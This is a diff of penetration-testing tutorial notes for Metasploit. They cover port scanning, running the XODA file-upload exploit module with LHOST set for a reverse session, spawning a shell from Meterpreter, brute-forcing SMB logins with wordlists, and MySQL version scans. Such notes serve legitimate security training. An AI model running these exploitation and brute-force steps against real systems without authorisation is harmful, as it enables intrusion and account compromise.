@@ -25,9 +25,6 @@ Just like the scanning phase, enumeration makes active connections to the device
 
 Auxiliary modules in Metasploit are primarily used for tasks like scanning, discovery, and fuzzing, which means gathering information without actually exploiting anything. These modules can scan for open ports and identify services running on those ports, like FTP, SSH, or HTTP, and are useful in both the early information-gathering stage and the post-exploitation phase of a penetration test.
 
-**Why use auxiliary modules when Nmap is available?**
-While Nmap is a good for scanning networks but it requires direct access to the internal network, which you won’t always have until you gain control of a system within that network. Transferring Nmap to the internal system is possible but not recommended due to potential security risks and detection.
-
 ---
 #### Running Port Scan with Metasploit Auxiliary Modules
 
@@ -59,13 +56,12 @@ run
  - **Note**: If you want to run a UDP scan, we’d use the ‘`udp_sweep`’ Module. You can back out, search for the module, just update the RHOST here and run the scan
 #### Gaining Initial Access using Metasploit
 
-1. **Find potential attack vectors**: Once a port scan reveals open services, the next step is to try to exploit them for initial access. For example, if port 80 is open, it likely indicates the presence of a web application. Using tools like `curl`, we can retrieve the webpage to gather information about the web application and its services, which might reveal vulnerabilities.
+1. **Find potential attack vectors**: Once a port scan reveals open services, the next step is to try to exploit them for initial access. For example, if port 80 is open, it likely indicates the presence of a web application. Using tools like `curl`, we can retrieve the webpage to gather information about the web application software and its services, which might reveal vulnerabilities and potential vectors.
 ```
 curl http://target_IP
 ```
-If the target is running an application like 'XODA'—an open-source, lightweight document management system that functions without a backend database—this could provide an attack vector. We can then search Metasploit for any available exploits targeting XODA, leveraging them to gain access.
 
-2. **Searching exploits in Metasploit**: Since we're focusing on port 80 and know this likely has some kind of web app running, we could try searching metasploit for `xoda` in particular to see if there’s an exploit for the application here. Xoda has the exploit module `exploit/unix/webapp/xoda_file_upload` that can be used here.
+2. **Searching exploits in Metasploit**: If we found any software or potential areas for access. We can then search Metasploit for any available exploits for the application software. An example would be XODA which is a open-source, lightweight document management system may provide an attack vector.  Xoda has the exploit module `exploit/unix/webapp/xoda_file_upload` that can be used here.
 ```
 search xoda
 
@@ -86,7 +82,7 @@ set LHOST your_ip
 exploit
 ```
 
-5. **Drop out of the meterpreter environment / Start shell** | Running the `shell` command in Meterpreter, you exit (or "drop out" of) the Meterpreter environment and start using the target system’s native command-line interface, where you can run commands directly as if you were physically or remotely logged into the machine. If the target is a Linux system you can launch an interactive Bash shell (**`/bin/bash -i`**) which isn't necessary but enables features like tab completion and command history.
+ 
 ```
 meterpreter> shell
 ```
@@ -232,7 +228,7 @@ ftp <target>
 
 SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (like printers) between computers on a local network (LAN). SMB uses port 445 (TCP). It operates over TCP port 445, enabling network clients to interact with server resources. However, originally, SMB ran on top of NetBIOS using port 139. The primary function of SMB is to facilitate resource sharing, but misconfigured shares or outdated versions can expose sensitive data or allow unauthorized access.
 
-SMB has both a service-level and share-level authentication where it can authenticate on different levels. The credentials you use need to be an actual user on that target system or domain. Normally, when you attempt to access a share and it prompts you to login in, this is can be treated as both the authentication at the share-level (\\Server\Share) and also against the smb service.
+SMB has both a service-level and share-level authentication where it can authenticate on different levels. The credentials you use need to be an actual user on that target system or domain. Normally, when you attempt to access a share and it prompts you to login in, this is can be treated as both the authentication at the share-level (\\\\Server\Share) and also against the smb service.
 
 SMB exists in different versions. SMBv2 and SMBv3 are part of the Windows operating system by default and are generally enabled as long as file sharing or network discovery is enabled. SMBv1 is an older version known for vulnerabilities like the EternalBlue exploit. SMBv1 is disabled by default in Windows 10 and newer versions due to security concerns. However, you can enable or disable SMB versions like SMBv1 through Windows Features.
 
@@ -279,7 +275,7 @@ ls -al /usr/share/nmap/scripts | grep -e “smb”
 ```
 ### SMB Brute Force
 
-The smb_login auxiliary module (`auxiliary/scanner/smb/smb_login`) that can be used to perform a brute force against the SMB service to hopefully get valid credentials. The default options for the scanner should be fine but we can set either wordlist files for both users or passwords > `USER_FILE (users) | PASS_FILE (pwds) USERPASS_FILE (Both)` or we can set individual accounts/pwds with `SMBUser`/`SMBPass`. Metasploit does provide wordlists that we can use here.
+The smb_login auxiliary module (`auxiliary/scanner/smb/smb_login`) can be used to perform a brute force against the SMB service to hopefully get valid credentials. The default options for the scanner should be fine but we can set either wordlist files for both users or passwords > `USER_FILE (users) | PASS_FILE (pwds) USERPASS_FILE (Both)` or we can set individual accounts/pwds with `SMBUser`/`SMBPass`. Metasploit does provide wordlists that we can use here.
 
 - Metasploit Users List Location = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
 - Metasploit Password List Location = `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
@@ -621,7 +617,7 @@ MySQL is an open-source relational database management system based on SQL (Stru
 
 ### Check for MySQL Database Version
 
-To find the MySQL database version, use the `mysql_version` auxiliary module. You can search for it using `search type:auxiliary name:mysql` or just use `auxiliary/scanner/mysql/mysql_version`. Running this scan will give you the database version and potentially the underlying OS details, which are pertinent for exploitation/post-exploitation.. This scan has the RPORT set to 3306 by default,  make sure the database is active on the expected port by doing a port scan/
+To find the MySQL database version, use the `mysql_version` auxiliary module. You can search for it using `search type:auxiliary name:mysql` or just use `auxiliary/scanner/mysql/mysql_version`. Running this scan will give you the database version and potentially the underlying OS details, which are pertinent for exploitation/post-exploitation. This scan has the RPORT set to 3306 by default,  make sure the database is active on the expected port by doing a port scan.
 
 ```
 use auxiliary/scanner/mysql/mysql_version
